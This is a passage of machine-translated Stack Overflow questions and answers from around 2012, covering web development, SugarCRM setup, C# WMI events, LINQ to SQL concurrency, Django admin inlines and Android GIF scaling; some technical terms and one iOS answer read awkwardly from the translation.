javacript 是从他们的服务器加载的，所以我无法更改。

我试图用 jQuery（准备好文档）来改变它，比如

```
$('#facebook_button').html('f'); 
```

我用 CSS 试过了

```
#facebook_button {content: 'f'} 
```

但都没有奏效。我还尝试简单地从应该输出代码的函数中复制输出，但这也不起作用。

你可以在 test.nowillnoskill.net 看到我的尝试。在侧边栏中，顶部有我的图标字体按钮（这就是我想要的），下方有更改背景的按钮。你可以看到底部的真的很模糊和丑陋。

有谁知道我该怎么做？我已经问过插件的作者，但他们没有回应

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T10:49:32.610

如果我没记错的话，您已经向我们发送了有关此问题的支持请求。

您必须添加`:before`：

```
#button_facebook:before {
    content: 'f';
} 
```

然而，这不是一个很好的解决方案。没有安装此字体的人根本看不到预期的页面。最好的办法是使用自定义图像。

# php - Sugar CRM 集成的安装指南

> ID：11702716
> 
> 赞同：1
> 
> 时间：2012-07-28T16:25:41.243
> 
> 标签：php, sugarcrm

我想将 Sugar CRM 集成到我现有的 Web 应用程序中。我搜索了安装过程，但我有一些模棱两可的想法。

假设我的应用程序正在运行`www.myhost.com`。现在我想将 Sugar CRM 集成到我现有的网络中。我发现下载了sugar CRM并按照安装向导进行操作。

**现在**我的问题是在哪里安装 Sugar CRM。我需要将它安装在任何其他 Web 服务器上吗？因为在安装过程中，它被写入将所有糖 CRM 文件复制到您的根文件夹。我是否必须为此拥有其他服务器？如果是这样，那么如何将它集成到我的 Web 应用程序中。

如果在我的应用程序运行的同一台服务器上，我将我的 web 文件放在运行在 www.myhost.com 上的根目录上，那么这些糖 crm 放在哪里？

请指导我。

问候。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-29T04:04:37.163

Sugar 将从您解压缩 zip 文件的任何位置运行，只要它位于“web 根”子目录中。例如，如果这是您的网络根目录：

> /srv/www/

您可以在以下位置解包糖：

> /srv/www/sugarcrm

或者

> /srv/www/webapps/sugarcrm

或者

> /srv/www/sugar/crm

只要 http 服务器可以访问 index.php 和 install.php 文件，就可以了（当然，通常需要正确设置权限等）

此外，您可以更新您的 dns 和 vhosts，以便`/srv/www/webapps/sugarcrm`可以通过`crm.mywebsite.com`等方式访问。

长话短说，您可以将解压缩文件放在任何地方，只要 apache 或您正在运行的任何东西知道如何获取它并且您知道在那里获取 apache 的 URL。

我有很多次只是通过执行以下操作克隆了 Sugar 的生产实例：

> cp /srv/www/sugar /srv/www/sugar/sandbox

然后克隆数据库并更新`config.php`文件。然后我就去`mywebsite.org/sugar/`生产和`mywebsite.org/sugar/sandbox`克隆。

Sugar 仍在努力实现真正的模块化，但就应用程序本身而言，它几乎是拖放操作。

# javascript - 如何使用 JavaScript 操作 html 按钮元素的“onclick”事件？

> ID：11702724
> 
> 赞同：1
> 
> 时间：2012-07-28T16:26:38.617
> 
> 标签：javascript

```
document.getElementById("RightButton").innerHTML="Back to Question";
document.getElementById("RightButton").onclick=GoBack(); 
```

是我为解决我的问题而编写的代码。第一行成功更改了按钮的名称，但第二行根本不起作用。

正如您可能已经发现的那样，我完全是一个新手。如果您使用过多的行话，我可能需要另一个问题才能弄清楚行话。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T16:28:34.877

只需删除`()`. 这样，您传递函数本身而不是调用它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-28T16:29:26.700

`GoBack`是一个函数。将函数引用分配给`onclick`属性，但不要立即使用`()`. 这样，您将调用的结果分配为处理程序，而不是单击元素时要执行的函数。[在此处](http://www.quirksmode.org/js/events_tradmod.html)阅读有关活动注册的更多信息。

```
var button = document.getElementById("RightButton");
button.innerHTML = "Back to Question";
button.onclick = GoBack; 
```

注意，通常只有构造函数使用大写字母。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T16:32:03.347

您正在调用该`GoBack()`函数，而不是将其分配给`onclick`事件。将您的代码更改为以下内容，您应该已准备就绪。

```
document.getElementById("RightButton").onclick=GoBack; 
```

# playframework - 等效于 Play 中的 ServletContextListener

> ID：11702727
> 
> 赞同：1
> 
> 时间：2012-07-28T16:27:10.257
> 
> 标签：playframework, playframework-2.0

我是服务器端开发的新手，最近一直在试验 Play 框架。我很想知道 Play 中是否有相当于 ServletContextListener 的东西。我从 Javadocs 中找到了一个[Application](http://www.playframework.org/documentation/api/2.0.2/java/index.html)类和一个[Plugin类。](http://www.playframework.org/documentation/api/2.0.2/java/index.html)

我想在我的 Web 应用程序启动时启动一个蓝牙服务器，并在 Web 应用程序退出时将其关闭。

提前谢谢了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T17:16:25.400

看一下[Global 对象](https://github.com/playframework/Play20/wiki/JavaGlobal)：启动你的蓝牙服务器到`onStart()`方法，并在方法中停止它`onStop()`。

```
public class Global extends GlobalSettings {

  @Override
  public void onStart(Application app) {
    Logger.info("Application has started");
  }  

  @Override
  public void onStop(Application app) {
    Logger.info("Application shutdown...");
  }  

} 
```

此类`Global`必须位于文件夹的根`app`目录中。

# intellij-idea - 使用 Jetty 在 Intellij Idea 中配置调试器

> ID：11702731
> 
> 赞同：0
> 
> 时间：2012-07-28T16:27:48.680
> 
> 标签：intellij-idea, jetty

我无法使用码头配置 intellij idea 调试器。我有码头 1.8。我在 jetbrains 站点上的配置之后创建了调试配置。我运行了调试器，它部署了我的工件，但是当我点击服务器时，我得到服务不可用。我看到了日志，它说在 lib 中找不到我的任何类文件的类定义。我重新启动了调试器，但这次它显示“服务器未连接，请单击部署”。单击部署后，会一次又一次地显示相同的消息。但是当我现在点击服务器时，我可以看到我的主页。但调试器未激活。现在，如果我重新启动调试器它不会重新启动。即使在我关闭想法之后，码头仍然落后，因为我仍然可以访问我的主页。我对发生的所有这些奇怪的事情一无所知。如果有人可以提供详细的配置来使用码头配置想法进行调试。谢谢我正在使用 Windows 7，带有想法 11 和 jdk 1.7

# javascript - JavaScript：是否有完全支持环视的正则表达式库？

> ID：11702735
> 
> 赞同：5
> 
> 时间：2012-07-28T16:28:18.057
> 
> 标签：javascript, regex

由于[JavaScript 内置的正则表达式库](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)不支持[后向查找](http://www.regular-expressions.info/lookaround.html#lookbehind)，我想知道是否有一个库可以纯粹在 JavaScript 中实现正则表达式引擎。

就我而言，性能并不重要（只要在短字符串中搜索简单表达式不需要几秒钟或更长时间）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T17:16:34.417

缺少后视的常见解决方法是匹配（而不是锚定到）您感兴趣的位之前的内容，然后将其重新插入回调中。

用 替换所有实例`foo`，`bar`其中前面有一个数字。

```
var str = 'foo 1foo foo2';
console.log(str.replace(/(\d)foo/g, function($0, $1) {
    return $1+'bar';
})); //foo 1bar foo1 
```

在 JS 中有*一些*lookbehind 的实现，**包括我写的一个（[文档](https://web.archive.org/web/20130403012523js_/http://mitya.co.uk/scripts/source/164.js)；[代码](https://web.archive.org/web/20130403012523js_/http://mitya.co.uk/scripts/source/164.js)）**，其中正或负的lookbehind 作为额外参数传递。使用它，这将得到与上面相同的结果：

```
console.log(str.replace2(/foo/g, 'bar', '(?<=\\d)')); 
```

# html - 识别文章标签

> ID：11702736
> 
> 赞同：0
> 
> 时间：2012-07-28T16:28:27.837
> 
> 标签：html, regex, parsing, html-parsing, pattern-matching

我正在尝试识别给定 URL 的标签。

标签规范有什么约定吗？任何基于常见用法的启发式方法？

我指的是对其内容进行分类的站点内标签。例如，在每篇 TC 文章的末尾，您都可以找到一个“标签”部分。大多数内容网站也是如此。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:41:08.567

我希望我理解你的问题。我相信你指的是像'html''regex'之类的标签，就像你问题的结尾一样。

理论上，您可以假设页面使用`rel="xyz"`for 标签链接。Stackoverflow 做到了，我知道的其他一些网站也做到了。

[http://microformats.org/wiki/rel-tag](http://microformats.org/wiki/rel-tag)

但我认为它不是很可靠。由于没有“必须”，因此无法保证此类标签。

无论如何，如果您想尝试并解析内容，我不建议您从头开始。[例如， Jsoup](http://jsoup.org/)在一个非常漂亮的库中提供了很多功能。您甚至可以找到具有特定属性的链接标签。

# c# - 如何在 C# 中使用 WMI 事件

> ID：11702737
> 
> 赞同：6
> 
> 时间：2012-07-28T16:28:27.030
> 
> 标签：c#, events, wmi

有一些事件通过 WMI 公开，但我似乎找不到任何订阅和收到这些事件警报的示例。特别是我想实现[WmiMonitorBrightnessEvent](http://msdn.microsoft.com/en-us/library/aa394537%28v=vs.85%29)来向 Growl/Snarl 推送通知。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-07-28T18:15:39.433

这是接收[`WmiMonitorBrightnessEvent`](http://msdn.microsoft.com/en-us/library/aa394537%28v=vs.85%29)WMI 事件的示例代码。

```
using System;
using System.Collections.Generic;
using System.Management;
using System.Text;

namespace GetWMI_Info
{
    public class EventWatcherAsync 
    {
        private void WmiEventHandler(object sender, EventArrivedEventArgs e)
        {
            Console.WriteLine("Active :          " + e.NewEvent.Properties["Active"].Value.ToString());
            Console.WriteLine("Brightness :      " + e.NewEvent.Properties["Brightness"].Value.ToString());
            Console.WriteLine("InstanceName :    " + e.NewEvent.Properties["InstanceName"].Value.ToString());

        }

        public EventWatcherAsync()
        {
            try
            {
                string ComputerName = "localhost";
                string WmiQuery;
                ManagementEventWatcher Watcher;
                ManagementScope Scope;   

                if (!ComputerName.Equals("localhost", StringComparison.OrdinalIgnoreCase)) 
                {
                    ConnectionOptions Conn = new ConnectionOptions();
                    Conn.Username  = "";
                    Conn.Password  = "";
                    Conn.Authority = "ntlmdomain:DOMAIN";
                    Scope = new ManagementScope(String.Format("\\\\{0}\\root\\WMI", ComputerName), Conn);
                }
                else
                    Scope = new ManagementScope(String.Format("\\\\{0}\\root\\WMI", ComputerName), null);
                Scope.Connect();

                WmiQuery ="Select * From WmiMonitorBrightnessEvent";

                Watcher = new ManagementEventWatcher(Scope, new EventQuery(WmiQuery));
                Watcher.EventArrived += new EventArrivedEventHandler(this.WmiEventHandler);
                Watcher.Start();
                Console.Read();
                Watcher.Stop();
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception {0} Trace {1}", e.Message, e.StackTrace);
            }

        }

        public static void Main(string[] args)
        {
           Console.WriteLine("Listening {0}", "WmiMonitorBrightnessEvent");
           Console.WriteLine("Press Enter to exit");
           EventWatcherAsync eventWatcher = new EventWatcherAsync();
           Console.Read();
        }
    }
} 
```

如果您是 WMI 新手，请尝试使用类似的工具[`WMI Delphi Code Creator`](http://code.google.com/p/wmi-delphi-code-creator/)并阅读与此主题相关的文档[`Receiving a WMI Event`](http://msdn.microsoft.com/en-us/library/windows/desktop/aa393013%28v=vs.85%29.aspx)

# jquery - 格式化序列化数组

> ID：11702747
> 
> 赞同：3
> 
> 时间：2012-07-28T16:29:38.527
> 
> 标签：jquery

jQuery.serializeArray 当前返回这个结果：

```
[Object { name="id",  value="0"}, Object { name="gender[]",  value="1"}, Object { name="gender[]",  value="2"}, Object { name="countries[]",  value="AU"}, Object { name="countries[]",  value="GB"}, Object { name="ages[]",  value="25"}, Object { name="ages[]",  value="99"}] 
```

我想以这种方式格式化结果：

```
{id: 0, gender: ['1', '2'], countries: ['AU', 'GB'], ages: ['25', '99']} 
```

如何做到这一点？

我不喜欢 serializeArray 如何格式化它的输出，我创建了以更可接受的方式格式化它的函数。

```
(function( $ ){
$.fn.serializeJSON=function() {
    var json = {}, propname;
    $.each($(this).serializeArray(), function(index, n){
        propname = n.name.replace('[]', '');
        if (!json.hasOwnProperty(propname))
        {
            json[propname] = n.value;
        }
        else if( ! (json[propname] instanceof Array) )
        {
            json[propname] = new Array(json[propname], n.value);
        }
        else
        {
            json[propname].push(n.value);
        }
    });
    return json;
}; 
})(jQuery); 
```

创建表单后，只需将这段代码放在某处：

```
$('#form_id').submit(function(e) {
    e.preventDefault();
    e.stopPropagation();
    var data = $(this).serializeJSON();
    console.log(data);
}) 
```

我希望它对那些喜欢如何将表单发布到 PHP 的人有所帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-29T15:18:08.327

我用这个：

```
$.fn.serializeObject = function(options) {

    options = $.extend({}, options);

    var self = this,
        json = {},
        push_counters = {},
        patterns = {
            "validate": /^[a-zA-Z][a-zA-Z0-9_]*(?:\[(?:\d*|[a-zA-Z0-9_]+)\])*$/,
            "key":      /[a-zA-Z0-9_\sąćęłóśżźĄĆĘŁÓŚŻŹ\/-]+|(?=\[\])/g,
            "push":     /^$/,
            "fixed":    /^\d+$/,
            "named":    /^[a-zA-Z0-9_]+$/
        };

    this.build = function(base, key, value){
        base[key] = value;
        return base;
    };

    this.push_counter = function(key){
        if(push_counters[key] === undefined){
            push_counters[key] = 0;
        }
        return push_counters[key]++;
    };

    $.each($(this).serializeArray(), function(){
        var k,
            keys = this.name.match(patterns.key),
            merge = this.value,
            reverse_key = this.name;

        while((k = keys.pop()) !== undefined){
            reverse_key = reverse_key.replace(new RegExp("\\[" + k + "\\]$"), '');

            merge = self.build({}, k, merge);
        }
        json = $.extend(true, json, merge);
    });

    return json;
}; 
```

# iphone - UIModalTransitionStylePartialCurl 不会触发 ViewWillAppear

> ID：11702750
> 
> 赞同：1
> 
> 时间：2012-07-28T16:29:55.730
> 
> 标签：iphone, objective-c, ios

我正在使用 UIReferenceLibraryViewController 并希望在它被关闭时播放声音。我在主控制器的 viewWillAppear 事件中调用我的声音。但是，如果我将 UIReferenceLibraryViewController ModalTransitionStyle 样式更改为 UIModalTransitionStylePartialCurl，则不会触发 viewWillAppear。有没有其他方法可以捕捉到它的解雇？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T18:46:58.647

关闭时`viewWillAppear`不会调用主控制器的方法是有道理的，因为您的主控制器的视图从未完全从屏幕上删除。你真正感兴趣的是什么时候被解散，而不是你的主控制器出现的时候，所以相应地构造你的代码。也就是说，子类化并将您的声音播放到子类的or中。这适用于任何过渡风格。`UIModalTransitionStylePartialCurl``UIReferenceLibraryViewController``UIReferenceLibraryViewController``UIReferenceLibraryViewController``viewWillDisappear``viewDidDisappear`

# jquery - jQuery 选择器作为函数参数

> ID：11702752
> 
> 赞同：1
> 
> 时间：2012-07-28T16:30:19.667
> 
> 标签：jquery, oop

在下面的代码中，我尝试将 jQuery listView 选择器作为参数传递给函数“makeObject”。我遇到的问题是代码无法识别函数“createList”中选择器的 .listview 方法。

我想要一个解决方案，它只需传入一个字符串并在被调用函数内重建选择器。

```
<head>
    <script src="http://code.jquery.com/jquery-latest.js"></script>
    <script>
        function Object() {
            this.selector;
            this.createList;
        }

        function makeObject(selector) {
            var result = new Object();
            result.selector = selector;
            result.createList = createList;

            return result;
        }

        function createList() {
            this.selector.append("<li>list item 1</li>");
            this.selector.append("<li>list item 2</li>");
            this.selector.append("<li>list item 3</li>");
            this.selector.listview("refresh");
        }

        var selectorParam = $("#testList");
        var testObject = makeObject(selectorParam);
        testObject.createList();
    </script>
</head>

<body>
    <ul id="testList" data-role="listview"></ul>
</body> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:57:03.763

你不想这样做吗：

```
 $("#testList").append('<li>item 3</li>') 
```

或者

```
 function makeObject(selector) {
         $(selector).append('<li>item 3</li>')
    } 
```

# php - 在使用 curl 获取文件名之前，是否需要对 $_POST 中的文件名进行清理？

> ID：11702754
> 
> 赞同：1
> 
> 时间：2012-07-28T16:30:45.407
> 
> 标签：php, security, curl

var 只是完整文件规范的文件名部分。

例如：

```
$file = $_POST['name'];
curl_exec("https:/example.com/some_api/".$file.".json"); 
```

顺便说一句，所有*有效*请求都将从一个域发布。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T16:31:56.747

您不需要进行消毒（为了安全），因为这可能会导致安全问题（`curl`可能已经处理过类似的事情），但您可能需要`urlencode`它才能工作。另一方面，您可能不需要*它* `urlencode`，但由于`_POST`参数是`urldecode`自动的，因此需要初始的双重编码。

顺便说一句，这是错误的。您需要`curl_exec`使用`curl`资源，而不是 URL。你想要`curl_exec(curl_init($url))`（但你可能需要设置选项和类似的东西）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:32:07.057

只是为了安全起见，你可能想要`urlencode()`它。

```
$file = urlencode($_POST['name']); 
```

这样，如果有人尝试一些花哨的东西，它会更安全。

# c# - ASP.NET C# Webservice 每 n 秒检索一次数据并写入数据库

> ID：11702757
> 
> 赞同：0
> 
> 时间：2012-07-28T16:30:56.183
> 
> 标签：c#, asp.net, sql, database, web-services

我正在尝试编写一个 ASP.NET C# web 服务，它在运行时连接到 OPC 服务器（暂时忽略 OPC 部分），检索大量数据，然后以设定的时间间隔将其写入/插入 SQL 数据库。

然后，我的 Web 应用程序将允许用户连接到数据库并查看 Web 服务不断写入的实时数据。

我对 web 服务完全陌生，我可能已经“错过了重点”，但基本上我需要该服务在后台运行并填充数据库，以便所有不同的用户都可以实时查看数据。

对此有什么想法吗？我完全迷路了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:40:01.683

我认为您不需要 Web 服务在后台插入数据，您可以编写一个 Windows 服务来获取数据并将其插入数据库。

Web 服务不用于此类场景。它们是完全不同的东西，否则 Windows 服务可以用来做你想做的事情，

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:43:56.627

听起来您想从 Web 服务中检索数据，然后将数据存储在数据库中。有一些机制可以做到这一点。您可以设置一个单独的应用程序来调用该服务。此应用程序可以作为计划任务以设定的时间间隔运行。

就“实时”检索数据而言，您可以创建一个 Web 应用程序，该应用程序利用 AJAX 使网页与数据库中的最新记录保持同步。

# mercurial - mercurial 错误 http 500 访问被拒绝

> ID：11702760
> 
> 赞同：3
> 
> 时间：2012-07-28T16:31:58.900
> 
> 标签：mercurial

当我尝试将我最近的提交推送到我的远程服务器时，我收到一条`mercurial error http 500 access denied`错误消息。

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T16:31:58.900

```
mercurial error http 500 access denied 
```

这可能是由您要推送到的服务器上的访问问题引起的。在我的服务器上，我不小心创建了带有`root`所有者和组的 mercurial repo。

我刚刚更改了服务器端 repo 的所有者和组， `sudo chown -R www-data:www-data MyRepo/` 并且能够再次推送。

# genetic-algorithm - 小波包分解、特征选择和SVM

> ID：11702767
> 
> 赞同：0
> 
> 时间：2012-07-28T16:33:11.100
> 
> 标签：genetic-algorithm, svm, wavelet, feature-selection

我想了解更多关于使用小波包分解、特征选择和 SVM 的故障检测模型。可以在这里阅读一些相关论文：

[http://ieeexplore.ieee.org/xpls/abs_all.jsp?arnumber=4547208](http://ieeexplore.ieee.org/xpls/abs_all.jsp?arnumber=4547208)

[https://mospace.umsystem.edu/xmlui/bitstream/handle/10355/4845/research.pdf?sequence=3](https://mospace.umsystem.edu/xmlui/bitstream/handle/10355/4845/research.pdf?sequence=3)

我的问题是在“特征选择”步骤中，我们需要选择小波包节点（及其计算的 rms 值）作为最终 SVM 分类器的特征。在 SVM 中，我们还需要知道每个向量的标签 (+1, -1)，但是我们如何在特征选择过程中获得这个标签。我真的不太了解使用 10 倍 SVM 的遗传算法（GA），如上述论文。任何人都可以向我解释这一点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-29T19:41:13.197

在列出的论文中，作者试图通过仅使用来自具有相对较低 EMI 噪声的频带的数据包训练 SVM 来最小化分类器中的噪声量。因此，他们将遗传算法纳入其特征选择步骤，如下所示：

首先，在这种情况下，遗传算法将是一堆 0 和 1，其长度等于您特定问题的频带数。每个“槽”（在遗传算法中实际上称为“基因”）对应于您在训练分类器时是否应该使用来自该频带的数据。

因此，如果您为数据使用总共 10 个频带，则每个个体或染色体（一组插槽/基因）的大小将是 10，并且看起来像这样（只是一堆 10 个 1s/0s）

0110101000

所以你从生成一整串随机染色体开始，一整串有多少？这取决于您的问题，并且肯定需要一些努力来确定...我建议根据您的硬件能力从几百到几百万尝试这个值。

好的，现在你有了随机的 0 和 1 串，那又如何呢？

好吧，这是有趣的部分，您需要评估这些染色体中的每一个在为您选择数据时（单独/一次一个）的能力，因此对于每个染色体，您循环遍历数据并训练您的 SVN当且仅当该特定染色体在与该数据包的频带相对应的位置具有“1”时，数据包。

换句话说，如果您有一个示例染色体：1000000001，并假设您收到一个对应于第一个频带的数据包，您会将其接受到您的 SVN 训练集中。如果您收到该染色体第 5 个频带的数据包，则将其丢弃。

由于 GA 仅用于特征选择步骤，现在您只需查看染色体“接受”的数据包数据，并使用此数据正常训练您的 SVN（而不是整个训练数据集）。然后，您根据使用此数据训练的 SVN 计算误差，并根据染色体的好坏为染色体分配一个分数。

在对所有染色体重复此操作后，您现在拥有每个染色体的列表以及生成的 SVN 在分类方面的表现。然后，您保存您有史以来表现最好的染色体，并执行[遗传算法](http://en.wikipedia.org/wiki/Genetic_algorithm)步骤来创建一批全新的染色体。这个想法是，通过结合前面步骤中表现良好的染色体，您可以获得一些甚至更好的染色体来为您的 SVN 选择数据。你只需重复这个评估/重组程序，直到你没有看到新染色体的表现比你一直以来的最好。

有道理？

# c# - LINQ to SQL - 使用 OnPropertyChanged 更新时“未找到或更改行”

> ID：11702768
> 
> 赞同：1
> 
> 时间：2012-07-28T16:33:15.997
> 
> 标签：c#, linq, linq-to-sql, overriding, plinqo

以下代码中的 Save 方法失败，并出现错误“未找到或更改行”。

```
Question question = questionService.getQuestionById(id); 
// returning Context.Question.Where(q => q.id == id).SingleOrDefault()

question.Text = "some text";

questionService.Save(question); 
// Context.SubmitChanges(); 
```

Question 是使用 CodeSmith 和 PLINQO 模板生成的 DTO。但是，“未找到或更改行”错误仅在对 OnPropertyChanged 事件实施自定义覆盖以在创建或修改记录时自动插入之后发生。我分析了生成的查询，当执行 getQuestionById 方法时，它正在执行一个正常的选择语句。但是，如果修改日期返回为“2012-07-28 12:15:00.900”，当我尝试保存记录时，更新失败，因为它正在添加 Modified = '2012-07-28 12:15： 00.903' 到更新语句，这与数据库中存在的内容相差几毫秒。所以我知道这与添加到生成的 Question 对象的以下代码有关：

```
protected override void OnPropertyChanged(string property)
{
    this.UpdateProperties(property);
    base.OnPropertyChanged(property);
}

public static void UpdateProperties(this object updatedObject, string property)
{
    if (property == created || property = modified) return;
    // prevents an infinite loop 

    Update(updateObject);
    // sets updatedObject.Created and updateObject.Modified fields
} 
```

我发现一些帖子建议在 dbml 中将 UpdateMode 设置为从不用于使用比秒更高的精度的字段。我可以将此作为最后的手段，但我一直在将相同的代码添加到具有相同数据类型的其他表中一段时间​​没有任何问题，并且想了解为什么它只发生在这个表中。这似乎也有点随机失败，我没有重现它的具体步骤，但是当我不调试时它似乎确实发生得更频繁。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-30T06:00:21.773

我的猜测是您正在使用数据库中的已修改（和/或已创建）列来检查并发性。您也在自己更新此列。这种混合是不正确的。

更好的方法是使用时间戳作为并发检查列。此列将由 SQL 服务器设置（假设这是您使用的），并且不是日期时间，而是一些内部唯一数据库生成的值。

一些谷歌搜索给了我[这篇](http://mtaulty.com/CommunityServer/blogs/mike_taultys_blog/archive/2008/07/01/10557.aspx)文章，我认为它将很好地解释如何设置时间戳列的基础知识。

# django - 我应该如何处理多对多关系后面的 GenericForeignKey 的管理内联？

> ID：11702770
> 
> 赞同：0
> 
> 时间：2012-07-28T16:33:35.950
> 
> 标签：django, django-admin, django-contenttypes

我有一个 Django 模型，它可以有许多通用关系。这是通过手动创建连接模型来实现的：

```
class ContentProjectContentItem(models.Model):
    content_project = models.ForeignKey('ContentProject')

    # Generic relations via Content Type Framework
    object_id = models.PositiveIntegerField()
    content_type = models.ForeignKey(ContentType)
    item = generic.GenericForeignKey('content_type', 'object_id') 

    class Meta:
        unique_together = ('content_project', 'object_id', 'content_type')
        app_label = "cms" 
```

这通过 ManyToManyField 与父模型相关：

```
class ContentProject(models.Model):
    title = models.CharField(max_length=100)
    date_created = models.DateTimeField(auto_now_add=True)

    # Related content (Assets, Resources, Media, etc)
    content_items = models.ManyToManyField(ContentProjectContentItem) 
```

我仍在使用 Django 管理员开发我的技能，所以我不确定如何创建允许我将多个 ContentProjectContentItems 添加到 ContentProject 的内联。我尝试过使用`generic.GenericStackedInline`，但无济于事：

```
class ContentItemInline(generic.GenericStackedInline):
    name = "content_project"
    model = ContentProjectContentItem 

class ContentProjectAdmin(MPTTModelAdmin):
    list_display = ('title' , 'date_created')
    search_fields = ('title' , 'date_created')

    inlines = [
        ContentItemInline,
    ] 
```

我只是看到标准的 ManyToMany 多选`content_items`（这是我所期望的）。我不确定如何`ContentProjectAdmin`了解联结表的通用关系。有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T15:20:30.360

我最终实现了一个自定义 change_view 模板来手动添加表单元素，并覆盖表单保存方法来处理这个用例。

不是最漂亮的解决方案，但仍然有效。

# android - 无法在 Android Canvas 中缩放 gif 移动帧

> ID：11702773
> 
> 赞同：2
> 
> 时间：2012-07-28T16:34:30.413
> 
> 标签：android, scale, android-canvas, gif

我在缩放 GIF 电影帧时遇到问题。我在绘制框架之前使用 Canvas.scale(float sx, float sy) 。但它不绘制缩放框架，它什么也不画。有什么想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-05-03T09:44:35.527

如果您尝试在另一个布局中创建一个可缩放且可重用的专用视图，您也应该使用视图的 getWidth() 和 getHeight() 方法。

我在更改视图的专用尺寸时遇到了这个问题：canvas.getWidth() 是整个屏幕的宽度，而不是视图的宽度，所以我修改了 onDraw 方法如下。

```
@Override
protected void onDraw(Canvas canvas) {
    canvas.drawColor(Color.TRANSPARENT);
    super.onDraw(canvas);

    long now = android.os.SystemClock.uptimeMillis();  

    Paint p = new Paint();
    p.setAntiAlias(true);

    if (cur == 0) cur = now;  

    if(movie != null)
    {
        float scale = 1f;
        if(movie.height() > getHeight() || movie.width() > getWidth())
            scale = ( 1f / Math.min(canvas.getHeight() / movie.height(), canvas.getWidth() / movie.width()) ) + 0.25f;
        else    
            scale = Math.min(canvas.getHeight() / movie.height(), canvas.getWidth() / movie.width());

        canvas.scale(scale, scale);
        canvas.translate(((float)getWidth() / scale - (float)movie.width())/2f,
                ((float)getHeight() / scale - (float)movie.height())/2f);

        int relTime = (int)((now - cur) % movie.duration());
        movie.setTime(relTime);
        movie.draw(canvas, 0, 0);

        invalidate();
    }
} 
```

注意 getWidth(), getHeight() if 语句检查电影是否大于视图，在我的情况下，我的视图高度是 160，但我的 GIF 是 260，但是使用其他方法总是会将 GIF 画得太大，通过这些更改，我能够测试并看到它在我的视图为 1280 X 900 并且图像按比例放大的情况下以及我的视图为 1000 X 160 并且它按比例缩小的情况下工作。

祝你好运，玩得开心：D

-克里斯

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-15T19:09:20.273

这应该有效。

```
protected void onDraw(Canvas canvas)
{
    canvas.drawColor(Color.TRANSPARENT);

    canvas.scale(0.5f, 0.5f); // scale gif to its half size

    super.onDraw(canvas);

    /* movie.setTime . . . */

    movie.draw(canvas, ...);

    this.invalidate();

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-08-24T07:34:17.670

这是我的解决方案：

```
public class GifImageView extends View {
    private InputStream mInputStream;
    private Movie mMovie;
    public int mWidth, mHeight;
    private long mStart;
    private Context mContext;

    public GifImageView(Context context) {
        super(context);
        this.mContext = context;
    }

    public GifImageView(Context context, AttributeSet attrs) {
        this(context, attrs, 0);
    }

    public GifImageView(Context context, AttributeSet attrs, int defStyleAttr) {
        super(context, attrs, defStyleAttr);
        this.mContext = context;
        if (attrs.getAttributeName(1).equals("background")) {
            int id = Integer.parseInt(attrs.getAttributeValue(1).substring(1));
            setGifImageResource(id);
        }
    }

    private void init() {
        setFocusable(true);
        mMovie = Movie.decodeStream(mInputStream);
        mWidth = mMovie.width();
        mHeight = mMovie.height();

        requestLayout();
    }

    @Override
    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
        setMeasuredDimension(mWidth, mHeight);
    }

    @Override
    protected void onDraw(Canvas canvas) {
        long now = SystemClock.uptimeMillis();

        if (mStart == 0) {
            mStart = now;
        }

        if (mMovie != null) {
            int duration = mMovie.duration();
            if (duration == 0) {
                duration = 1000;
            }

            float scale = Math.min((float) canvas.getHeight() / (float) mMovie.height(), (float) canvas.getWidth() / (float) mMovie.width());

            canvas.scale(scale, scale);
            canvas.translate(((float) mWidth / scale - (float) mMovie.width()) / 2f,
                ((float) mHeight / scale - (float) mMovie.height()) / 2f);

            int relTime = (int) ((now - mStart) % duration);

            mMovie.setTime(relTime);
            mMovie.draw(canvas, 0, 0);
            invalidate();
        }
    }

    public void setGifImageResource(int id) {
        mInputStream = mContext.getResources().openRawResource(id);
        init();
    }

    public void setGifImageUri(Uri uri) {
        try {
            mInputStream = mContext.getContentResolver().openInputStream(uri);
            init();
        } catch (FileNotFoundException e) {
            Log.e("GIfImageView", "File not found");
        }
    }

    public void setSize(int dimension) {
        mWidth = dimension;
        mHeight = dimension;
    }
} 
```

将其添加到您的布局文件中：

```
<GifImageView
        android:id="@+id/gifView"
        android:layout_width="100dp"
        android:layout_height="100dp"
        android:layout_centerHorizontal="true"
        android:background="@drawable/image" /> 
```

那么您可以简单地在 Java 代码中设置维度：

```
gifView.setSize(dimension); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-11-18T17:40:09.267

此示例允许我们根据图像的原始大小调整**GIF**的大小并**适合屏幕。**

[![在此处输入图像描述](../Images/dc1bea52a3f88fad11dcfc4ac45b9400.png)](https://i.stack.imgur.com/4sehG.jpg)

***PlayGifView.class***

```
public class PlayGifView extends View{

